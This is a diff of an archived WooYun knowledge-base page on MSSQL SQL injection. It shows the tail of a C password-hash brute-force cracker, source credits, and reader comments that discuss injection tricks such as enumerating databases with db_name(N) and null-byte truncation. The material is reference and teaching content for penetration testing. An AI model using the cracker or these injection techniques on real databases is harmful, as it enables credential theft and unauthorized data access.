+                   printf("Error %x during CryptCreatHash!\n", GetLastError());
+                   return 0;
+         }
+if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
+         {
+                   printf("Error %x during CryptHashData!\n", GetLastError());
+                   return FALSE;
+         }
+CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&amp;hl,0);
+// Test the first byte only. Much quicker.
+if(szhash[0] == cmp)
+         {
+                   // If first byte matches try the rest
+                   ptr = pucase;
+                   cnt = 1;
+                   while(cnt &lt; 20)
+                   {
+                               ptr = ptr + 2;
+                               strncpy(pucfirst,ptr,2);
+                               sscanf(pucfirst,"%x",&amp;cmp);
+                               if(szhash[cnt]==cmp)
+                                        cnt ++;
+                               else
+                               {
+                                        break;
+                               }
+                   }
+                   if(cnt == 20)
+                   {
+                        // We've found the password
+                        printf("\nA MATCH!!! Password is %s\n",wttf);
+                        return 0;
+                     }
+             }
+             count = 0;
+             cnt=0;
+           }
+  return 0;
+}
+</code></pre>
+
+<p>PS:英文原文内容来源于:<a href="http://websec.ca/kb/sql_injection#MSSQL_Testing_Version">http://websec.ca/kb/sql_injection#MSSQL_Testing_Version</a></p>
+
+<p>楼主在原内容基础上进行了一些补充,并分享了一些在测试过程中发现的技巧.</p>
+
+<p>参考来源:
+<a href="http://websec.ca/kb/sql_injection#MSSQL_Testing_Version">http://websec.ca/kb/sql_injection#MSSQL_Testing_Version</a>
+<a href="http://safe.it168.com/ss/2007-09-10/200709100935438.shtml">http://safe.it168.com/ss/2007-09-10/200709100935438.shtml</a></p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">t</span>
+                 <span class="reply-time">2016-05-19 13:05:32</span>
+        </div>
+        <p></p><p>t</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">屎蛋</span>
+                 <span class="reply-time">2015-04-15 16:06:25</span>
+        </div>
+        <p></p><p>mark</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">梧桐雨</span>
+                 <span class="reply-time">2015-01-13 18:30:48</span>
+        </div>
+        <p></p><p>皂皂有意见了。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">克洛法</span>
+                 <span class="reply-time">2014-11-25 11:21:13</span>
+        </div>
+        <p></p><p>写的非常好，学到了不少东西，谢谢</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Ann-marie</span>
+                 <span class="reply-time">2014-10-05 23:56:45</span>
+        </div>
+        <p></p><p><strong>Ann-marie...</strong></p>
+<p>MSSQL注射知识库 v 1.0 | WooYun知识库...</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">wangy3e</span>
+                 <span class="reply-time">2014-08-26 23:06:10</span>
+        </div>
+        <p></p><p>good thanks</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">bee propolis cream</span>
+                 <span class="reply-time">2014-08-19 07:29:59</span>
+        </div>
+        <p></p><p><strong>bee propolis cream...</strong></p>
+<p>MSSQL注射知识库 v 1.0 | WooYun知识库...</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">diguoji</span>
+                 <span class="reply-time">2014-06-04 12:47:12</span>
+        </div>
+        <p></p><p>遇到好文章，不但要记住文章内容，更要对作者表示感谢</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">带馅儿馒头</span>
+                 <span class="reply-time">2014-05-09 09:20:02</span>
+        </div>
+        <p></p><p>Good</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Mody</span>
+                 <span class="reply-time">2014-05-06 23:36:05</span>
+        </div>
+        <p></p><p>mark，正找呢</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">xiaoL</span>
+                 <span class="reply-time">2014-05-06 10:23:42</span>
+        </div>
+        <p></p><p>良心之作</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Telnett</span>
+                 <span class="reply-time">2014-05-05 21:43:00</span>
+        </div>
+        <p></p><p>这个很不错！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">瞌睡龙</span>
+                 <span class="reply-time">2014-05-05 15:37:00</span>
+        </div>
+        <p></p><p>产品经理太多了，研发不够用了。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">园长</span>
+                 <span class="reply-time">2014-05-05 15:09:05</span>
+        </div>
+        <p></p><p>龙老板为何不在文章末尾加个”感谢“按钮呢？比如某些不错的文章除了收藏还可以...</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Xeyes</span>
+                 <span class="reply-time">2014-05-05 13:20:59</span>
+        </div>
+        <p></p><p>db_name(5)读出当前库确实是巧合哈,因为从sql 2005以上版本,自带的数据库有4个,第5个开始就是自定义库. 如果存在多个库第五个就不一定是当前库了,当前库应该为db_name(0).</p>
+<p>这个备忘录非常赞.<br>
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet<br>
+感谢luwikes 分享.</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">小胖子</span>
+                 <span class="reply-time">2014-05-05 12:56:10</span>
+        </div>
+        <p></p><p>感谢分享~</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">isno</span>
+                 <span class="reply-time">2014-05-05 11:16:15</span>
+        </div>
+        <p></p><p>非常有用的文档，感谢分享！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">计算姬</span>
+                 <span class="reply-time">2014-05-05 10:27:07</span>
+        </div>
+        <p></p><p>良心好文</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">瞌睡龙</span>
+                 <span class="reply-time">2014-05-05 09:34:52</span>
+        </div>
+        <p></p><p>good job〜</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">luwikes</span>
+                 <span class="reply-time">2014-05-05 09:12:37</span>
+        </div>
+        <p></p><p>当前库是db_name()，如果你用db_name(5)读出来的与当前一致，那只能是巧合。你可以用db_name(N)读出所有的数据库名。<br>
+/*这个注释需要有*/结尾，否则会报错。<br>
+分号后面加个空字节的截断还是比较奇葩的，赞一个。<br>
+（看了下原文，你那个db_name(5)误会了原作者的意思，瑕不掩瑜）<br>
+另外，这个备忘录也很不错http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">园长</span>
+                 <span class="reply-time">2014-05-05 01:08:56</span>
+        </div>
+        <p></p><p>drops+1</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">虾米</span>
+                 <span class="reply-time">2014-05-04 19:19:48</span>
+        </div>
+        <p></p><p>mssql2008注入，可以列出所有数据库，但是读不到当前库的表，是不是说当前用户对当前库没有读取权限呢？那假如没有读取权限，那网站本身又怎么能好好的运行呢？不解，</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Murk Emissary</span>
+                 <span class="reply-time">2014-05-04 19:08:59</span>
+        </div>
+        <p></p><p>占一楼。文章收藏失败？</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
